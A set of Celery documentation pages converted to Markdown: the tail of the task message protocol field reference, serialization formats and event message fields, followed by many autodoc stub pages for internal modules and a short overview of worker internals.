        Estimated time of arrival. This is the date and time in ISO 8601 format. If not provided the message isn't scheduled, but will be executed asap.

  -   - `expires`
        
          - <span class="title-ref">string</span> (ISO 8601)
        
        <div class="versionadded">
        
        2.0.2
        
        </div>
        
        Expiration date. This is the date and time in ISO 8601 format. If not provided the message will never expire. The message will be expired when the message is received and the expiration date has been exceeded.

  -   - `taskset`
        
          - <span class="title-ref">string</span>
        
        The group this task is part of (if any).

  -   - `chord`
        
          - <span class="title-ref">Signature</span>
        
        <div class="versionadded">
        
        2.3
        
        </div>
        
        Signifies that this task is one of the header parts of a chord. The value of this key is the body of the cord that should be executed when all of the tasks in the header has returned.

  -   - `utc`
        
          - <span class="title-ref">bool</span>
        
        <div class="versionadded">
        
        2.5
        
        </div>
        
        If true time uses the UTC timezone, if not the current local timezone should be used.

  -   - `callbacks`
        
          - <span class="title-ref">\<list\>Signature</span>
        
        <div class="versionadded">
        
        3.0
        
        </div>
        
        A list of signatures to call if the task exited successfully.

  -   - `errbacks`
        
          - <span class="title-ref">\<list\>Signature</span>
        
        <div class="versionadded">
        
        3.0
        
        </div>
        
        A list of signatures to call if an error occurs while executing the task.

  -   - `timelimit`
        
          - <span class="title-ref">\<tuple\>(float, float)</span>
        
        <div class="versionadded">
        
        3.1
        
        </div>
        
        Task execution time limit settings. This is a tuple of hard and soft time limit value (<span class="title-ref">int</span>/<span class="title-ref">float</span> or <span class="title-ref">None</span> for no limit).
        
        Example value specifying a soft time limit of 3 seconds, and a hard time limit of 10 seconds:
        
            {'timelimit': (3.0, 10.0)}

#### Example message

This is an example invocation of a <span class="title-ref">celery.task.ping</span> task in json format:

`` `javascript     {"id": "4cc7438e-afd4-4f8f-a2f3-f46567e7ca77",      "task": "celery.task.PingTask",      "args": [],      "kwargs": {},      "retries": 0,      "eta": "2009-11-17T12:30:56.527191"}  Task Serialization ``\` ------------------

Several types of serialization formats are supported using the <span class="title-ref">content\_type</span> message header.

The MIME-types supported by default are shown in the following table.

> 
> 
> | Scheme  | MIME Type                      |
> | ------- | ------------------------------ |
> | json    | application/json               |
> | yaml    | application/x-yaml             |
> | pickle  | application/x-python-serialize |
> | msgpack | application/x-msgpack          |
> 

## Event Messages

Event messages are always JSON serialized and can contain arbitrary message body fields.

Since version 4.0. the body can consist of either a single mapping (one event), or a list of mappings (multiple events).

There are also standard fields that must always be present in an event message:

### Standard body fields

  - *string* `type`
    
    > The type of event. This is a string containing the *category* and *action* separated by a dash delimiter (e.g., `task-succeeded`).

  - *string* `hostname`
    
    > The fully qualified hostname of where the event occurred at.

  - *unsigned long long* `clock`
    
    > The logical clock value for this event (Lamport time-stamp).

  - *float* `timestamp`
    
    > The UNIX time-stamp corresponding to the time of when the event occurred.

  - *signed short* `utcoffset`
    
    > This field describes the timezone of the originating host, and is specified as the number of hours ahead of/behind UTC (e.g., -2 or +1).

  - *unsigned long long* `pid`
    
    > The process id of the process the event originated in.

### Standard event types

For a list of standard event types and their fields see the \[event-reference\](\#event-reference).

### Example message

This is the message fields for a `task-succeeded` event:

`` `python properties = {     'routing_key': 'task.succeeded',     'exchange': 'celeryev',     'content_type': 'application/json',     'content_encoding': 'utf-8',     'delivery_mode': 1, } headers = {     'hostname': 'worker1@george.vandelay.com', } body = {     'type': 'task-succeeded',     'hostname': 'worker1@george.vandelay.com',     'pid': 6335,     'clock': 393912923921,     'timestamp': 1401717709.101747,     'utcoffset': -1,     'uuid': '9011d855-fdd1-4f8f-adb3-a413b499eafb',     'retval': '4',     'runtime': 0.0003212, ) ``\`

---

celery._state.md

---

# `celery._state`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.\_state

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.\_state

</div>

---

celery.app.annotations.md

---

# `celery.app.annotations`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.annotations

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.annotations

</div>

---

celery.app.routes.md

---

# `celery.app.routes`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.routes

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.routes

</div>

---

celery.app.trace.md

---

# `celery.app.trace`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.trace

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.trace

</div>

---

celery.backends.arangodb.md

---

# `celery.backends.arangodb`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.arangodb

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.arangodb

</div>

---

celery.backends.asynchronous.md

---

# `celery.backends.asynchronous`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.asynchronous

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.asynchronous

</div>

---

celery.backends.azureblockblob.md

---

# `celery.backends.azureblockblob`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.azureblockblob

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.azureblockblob

</div>

---

celery.backends.base.md

---

# `celery.backends.base`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.base

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.base

</div>

---

celery.backends.cache.md

---

# `celery.backends.cache`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.cache

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.cache

</div>

---

celery.backends.cassandra.md

---

# `celery.backends.cassandra`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.cassandra

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.cassandra

</div>

---

celery.backends.consul.md

---

# celery.backends.consul

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.consul

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.consul

</div>

---

celery.backends.cosmosdbsql.md

---

# `celery.backends.cosmosdbsql`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.cosmosdbsql

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.cosmosdbsql

</div>

---

celery.backends.couchbase.md

---

# `celery.backends.couchbase`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.couchbase

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.couchbase

</div>

---

celery.backends.couchdb.md

---

# `celery.backends.couchdb`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.couchdb

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.couchdb

</div>

---

celery.backends.database.md

---

# `celery.backends.database`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.database

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.database

</div>

---

celery.backends.database.models.md

---

# `celery.backends.database.models`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.database.models

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.database.models

</div>

---

celery.backends.database.session.md

---

# `celery.backends.database.session`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.database.session

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.database.session

</div>

---

celery.backends.dynamodb.md

---

# `celery.backends.dynamodb`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.dynamodb

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.dynamodb

</div>

---

celery.backends.elasticsearch.md

---

# `celery.backends.elasticsearch`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.elasticsearch

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.elasticsearch

</div>

---

celery.backends.filesystem.md

---

# `celery.backends.filesystem`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.filesystem

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.filesystem

</div>

---

celery.backends.gcs.md

---

# `celery.backends.gcs`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.gcs

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.gcs

</div>

---

celery.backends.md

---

# `celery.backends`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends

</div>

---

celery.backends.mongodb.md

---

# `celery.backends.mongodb`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.mongodb

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.mongodb

</div>

---

celery.backends.redis.md

---

# `celery.backends.redis`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.redis

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.redis

</div>

---

celery.backends.rpc.md

---

# `celery.backends.rpc`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.rpc

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.rpc

</div>

---

celery.backends.s3.md

---

# `celery.backends.s3`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.backends.s3

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.backends.s3

</div>

---

celery.concurrency.base.md

---

# `celery.concurrency.base`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.concurrency.base

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.concurrency.base

</div>

---

celery.concurrency.eventlet.md

---

# `celery.concurrency.eventlet`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.concurrency.eventlet

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.concurrency.eventlet

</div>

---

celery.concurrency.gevent.md

---

# `celery.concurrency.gevent`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.concurrency.gevent

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.concurrency.gevent

</div>

---

celery.concurrency.md

---

# `celery.concurrency`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.concurrency

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.concurrency

</div>

---

celery.concurrency.prefork.md

---

# `celery.concurrency.prefork`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.concurrency.prefork

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.concurrency.prefork

</div>

---

celery.concurrency.solo.md

---

# `celery.concurrency.solo`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.concurrency.solo

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.concurrency.solo

</div>

---

celery.concurrency.thread.md

---

# `celery.concurrency.thread`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.concurrency.thread

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.concurrency.thread

</div>

---

celery.events.cursesmon.md

---

# `celery.events.cursesmon`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.events.cursesmon

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.events.cursesmon

</div>

---

celery.events.dumper.md

---

# `celery.events.dumper`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.events.dumper

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.events.dumper

</div>

---

celery.events.snapshot.md

---

# `celery.events.snapshot`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.events.snapshot

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.events.snapshot

</div>

---

celery.platforms.md

---

# `celery.platforms`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.platforms

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.platforms

</div>

---

celery.security.certificate.md

---

# `celery.security.certificate`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.security.certificate

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.security.certificate

</div>

---

celery.security.key.md

---

# `celery.security.key`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.security.key

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.security.key

</div>

---

celery.security.serialization.md

---

# `celery.security.serialization`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.security.serialization

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.security.serialization

</div>

---

celery.security.utils.md

---

# `celery.security.utils`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.security.utils

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.security.utils

</div>

---

celery.utils.abstract.md

---

# `celery.utils.abstract`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.abstract

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.abstract

</div>

---

celery.utils.collections.md

---

# `celery.utils.collections`

<div class="currentmodule">

celery.utils.collections

</div>

<div class="contents" data-local="">

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.collections

</div>

---

celery.utils.deprecated.md

---

# `celery.utils.deprecated`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.deprecated

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.deprecated

</div>

---

celery.utils.dispatch.md

---

# `celery.utils.dispatch`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.dispatch

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.dispatch

</div>

---

celery.utils.dispatch.signal.md

---

# `celery.utils.dispatch.signal`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.dispatch.signal

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.dispatch.signal

</div>

---

celery.utils.functional.md

---

# `celery.utils.functional`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.functional

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.functional

</div>

---

celery.utils.graph.md

---

# `celery.utils.graph`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.graph

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.graph

</div>

---

celery.utils.imports.md

---

# `celery.utils.imports`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.imports

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.imports

</div>

---

celery.utils.iso8601.md

---

# `celery.utils.iso8601`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.iso8601

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.iso8601

</div>

---

celery.utils.log.md

---

# `celery.utils.log`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.log

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.log

</div>

---

celery.utils.md

---

# `celery.utils`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils

</div>

---

celery.utils.nodenames.md

---

# `celery.utils.nodenames`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.nodenames

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.nodenames

</div>

---

celery.utils.objects.md

---

# `celery.utils.objects`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.objects

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.objects

</div>

---

celery.utils.saferepr.md

---

# `celery.utils.saferepr`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.saferepr

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.saferepr

</div>

---

celery.utils.serialization.md

---

# `celery.utils.serialization`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.serialization

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.serialization

</div>

---

celery.utils.sysinfo.md

---

# `celery.utils.sysinfo`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.sysinfo

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.sysinfo

</div>

---

celery.utils.term.md

---

# `celery.utils.term`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.term

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.term

</div>

---

celery.utils.text.md

---

# `celery.utils.text`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.text

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.text

</div>

---

celery.utils.threads.md

---

# `celery.utils.threads`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.threads

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.threads

</div>

---

celery.utils.time.md

---

# `celery.utils.time`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.time

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.time

</div>

---

celery.utils.timer2.md

---

# `celery.utils.timer2`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.utils.timer2

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.utils.timer2

</div>

---

celery.worker.autoscale.md

---

# `celery.worker.autoscale`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.autoscale

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.autoscale

</div>

---

celery.worker.components.md

---

# `celery.worker.components`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.components

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.components

</div>

---

celery.worker.control.md

---

# `celery.worker.control`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.control

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.control

</div>

---

celery.worker.heartbeat.md

---

# `celery.worker.heartbeat`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.heartbeat

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.heartbeat

</div>

---

celery.worker.loops.md

---

# `celery.worker.loops`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.loops

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.loops

</div>

---

celery.worker.pidbox.md

---

# `celery.worker.pidbox`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.worker.pidbox

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.worker.pidbox

</div>

---

index.md

---

# Internal Module Reference

  - Release  

  - Date  

<div class="toctree" data-maxdepth="1">

celery.worker.components celery.worker.loops celery.worker.heartbeat celery.worker.control celery.worker.pidbox celery.worker.autoscale celery.concurrency celery.concurrency.solo celery.concurrency.prefork celery.concurrency.eventlet celery.concurrency.gevent celery.concurrency.thread celery.concurrency.base celery.backends celery.backends.base celery.backends.asynchronous celery.backends.azureblockblob celery.backends.rpc celery.backends.database celery.backends.cache celery.backends.consul celery.backends.couchdb celery.backends.mongodb celery.backends.elasticsearch celery.backends.redis celery.backends.cassandra celery.backends.couchbase celery.backends.arangodb celery.backends.dynamodb celery.backends.filesystem celery.backends.cosmosdbsql celery.backends.s3 celery.backends.gcs celery.app.trace celery.app.annotations celery.app.routes celery.security.certificate celery.security.key celery.security.serialization celery.security.utils celery.events.snapshot celery.events.cursesmon celery.events.dumper celery.backends.database.models celery.backends.database.session celery.utils celery.utils.abstract celery.utils.collections celery.utils.nodenames celery.utils.deprecated celery.utils.functional celery.utils.graph celery.utils.objects celery.utils.term celery.utils.time celery.utils.iso8601 celery.utils.saferepr celery.utils.serialization celery.utils.sysinfo celery.utils.threads celery.utils.timer2 celery.utils.imports celery.utils.log celery.utils.text celery.utils.dispatch celery.utils.dispatch.signal celery.platforms celery.\_state

</div>

---

worker.md

---

# Internals: The worker

<div class="contents" data-local="">

</div>

## Introduction

The worker consists of 4 main components: the consumer, the scheduler, the mediator and the task pool. All these components runs in parallel working with two data structures: the ready queue and the ETA schedule.

## Data structures

### timer

The timer uses `heapq` to schedule internal functions. It's very efficient and can handle hundred of thousands of entries.

## Components

### Consumer

Receives messages from the broker using `Kombu`.

When a message is received it's converted into a <span class="title-ref">celery.worker.request.Request</span> object.

Tasks with an ETA, or rate-limit are entered into the <span class="title-ref">timer</span>, messages that can be immediately processed are sent to the execution pool.

ETA and rate-limit when used together will result in the rate limit being observed with the task being scheduled after the ETA.

### Timer

The timer schedules internal functions, like cleanup and internal monitoring, but also it schedules ETA tasks and rate limited tasks. If the scheduled tasks ETA has passed it is moved to the execution pool.

### TaskPool

This is a slightly modified <span class="title-ref">multiprocessing.Pool</span>. It mostly works the same way, except it makes sure all of the workers are running at all times. If a worker is missing, it replaces it with a new one.

---

celery.app.amqp.md

---

<div class="currentmodule">

celery.app.amqp

</div>

<div class="automodule">

celery.app.amqp

<div class="contents" data-local="">

</div>

# AMQP

<div class="autoclass">

AMQP

<div class="attribute">

Connection

Broker connection class used. Default is <span class="title-ref">kombu.Connection</span>.

</div>

<div class="attribute">

Consumer

Base Consumer class used. Default is <span class="title-ref">kombu.Consumer</span>.

</div>

<div class="attribute">

Producer

Base Producer class used. Default is <span class="title-ref">kombu.Producer</span>.

</div>

<div class="attribute">

queues

All currently defined task queues (a <span class="title-ref">Queues</span> instance).

</div>

<div class="attribute">

argsrepr\_maxsize

Max size of positional argument representation used for logging purposes. Default is 1024.

</div>

<div class="attribute">

kwargsrepr\_maxsize

Max size of keyword argument representation used for logging purposes. Default is 1024.

</div>

<div class="automethod">

Queues

</div>

<div class="automethod">

Router

</div>

<div class="automethod">

flush\_routes

</div>

<div class="autoattribute">

create\_task\_message

</div>

<div class="autoattribute">

send\_task\_message

</div>

<div class="autoattribute">

default\_queue

</div>

<div class="autoattribute">

default\_exchange

</div>

<div class="autoattribute">

producer\_pool

</div>

<div class="autoattribute">

router

</div>

<div class="autoattribute">

routes

</div>

</div>

# Queues

<div class="autoclass" data-members="" data-undoc-members="">

Queues

</div>

</div>

---

celery.app.autoretry.md

---

# `celery.app.autoretry`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.autoretry

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.autoretry

</div>

---

celery.app.backends.md

---

# `celery.app.backends`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.backends

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.backends

</div>

---

celery.app.builtins.md

---

# `celery.app.builtins`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.builtins

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.builtins

</div>

---

celery.app.control.md

---

# `celery.app.control`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.control

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.control

</div>

---

celery.app.defaults.md

---

# `celery.app.defaults`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.defaults

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.defaults

</div>

---

celery.app.events.md

---

# `celery.app.events`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.events

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.events

</div>

---

celery.app.log.md

---

# `celery.app.log`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.log

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.log

</div>

---

celery.app.md

---

<div class="currentmodule">

celery.app

</div>

<div class="automodule">

celery.app

<div class="contents" data-local="">

</div>

# Proxies

<div class="autodata">

default\_app

</div>

# Functions

<div class="autofunction">

app\_or\_default

</div>

<div class="autofunction">

enable\_trace

</div>

<div class="autofunction">

disable\_trace

</div>

</div>

---

celery.app.registry.md

---

# `celery.app.registry`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.registry

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.registry

</div>

---

celery.app.task.md

---

# `celery.app.task`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.task

</div>

<div class="automodule" data-members="Task, Context, TaskType">

celery.app.task

</div>

---

celery.app.utils.md

---

# `celery.app.utils`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.app.utils

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.app.utils

</div>

---

celery.apps.beat.md

---

# `celery.apps.beat`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.apps.beat

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.apps.beat

</div>

---

celery.apps.multi.md

---

# `celery.apps.multi`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.apps.multi

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.apps.multi

</div>

---

celery.apps.worker.md

---

# `celery.apps.worker`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.apps.worker

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.apps.worker

</div>

---

celery.beat.md

---

# `celery.beat`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.beat

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.beat

</div>

---

celery.bin.amqp.md

---

# `celery.bin.amqp`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.amqp

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.amqp

</div>

---

celery.bin.base.md

---

# `celery.bin.base`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.base

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.base

</div>

---

celery.bin.beat.md

---

# `celery.bin.beat`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.beat

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.beat

</div>

---

celery.bin.call.md

---

# `celery.bin.call`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.call

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.call

</div>

---

celery.bin.celery.md

---

# `celery.bin.celery`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.celery

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.celery

</div>

---

celery.bin.control.md

---

# `celery.bin.control`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.control

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.control

</div>

---

celery.bin.events.md

---

# `celery.bin.events`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.events

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.events

</div>

---

celery.bin.graph.md

---

# `celery.bin.graph`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.graph

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.graph

</div>

---

celery.bin.list.md

---

# `celery.bin.list`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.list

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.list

</div>

---

celery.bin.logtool.md

---

# `celery.bin.logtool`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.logtool

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.logtool

</div>

---

celery.bin.migrate.md

---

# `celery.bin.migrate`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.migrate

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.migrate

</div>

---

celery.bin.multi.md

---

# `celery.bin.multi`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.multi

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.multi

</div>

---

celery.bin.purge.md

---

# `celery.bin.purge`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.purge

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.purge

</div>

---

celery.bin.result.md

---

# `celery.bin.result`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.result

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.result

</div>

---

celery.bin.shell.md

---

# `celery.bin.shell`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.shell

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.shell

</div>

---

celery.bin.upgrade.md

---

# `celery.bin.upgrade`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.upgrade

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.upgrade

</div>

---

celery.bin.worker.md

---

# `celery.bin.worker`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bin.worker

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bin.worker

</div>

---

celery.bootsteps.md

---

# `celery.bootsteps`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.bootsteps

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.bootsteps

</div>

---

celery.contrib.abortable.md

---

# `celery.contrib.abortable`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.contrib.abortable

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.contrib.abortable

</div>

---

celery.contrib.django.task.md

---

# `celery.contrib.django.task`

<div class="versionadded">

5.4

</div>

<div class="contents" data-local="">

</div>

## API Reference

<div class="currentmodule">

celery.contrib.django.task

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.contrib.django.task

</div>

---

celery.contrib.migrate.md

---

# `celery.contrib.migrate`

<div class="contents" data-local="">

</div>

<div class="currentmodule">

celery.contrib.migrate

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.contrib.migrate

</div>

---

celery.contrib.pytest.md

---

# `celery.contrib.pytest`

<div class="contents" data-local="">

</div>

## API Reference

<div class="currentmodule">

celery.contrib.pytest

</div>

<div class="automodule" data-members="" data-undoc-members="">

celery.contrib.pytest

</div>

---

celery.contrib.rdb.md

---

# `celery.contrib.rdb`

<div class="currentmodule">

celery.contrib.rdb

</div>

<div class="automodule">

celery.contrib.rdb

<div class="autofunction">

set\_trace

</div>

<div class="autofunction">

debugger

</div>

<div class="autoclass">

Rdb

</div>

</div>

---

celery.contrib.sphinx.md

---

# celery.contrib.sphinx

<div class="currentmodule">

celery.contrib.sphinx

</div>

<div class="automodule" data-members="">

celery.contrib.sphinx

</div>

---

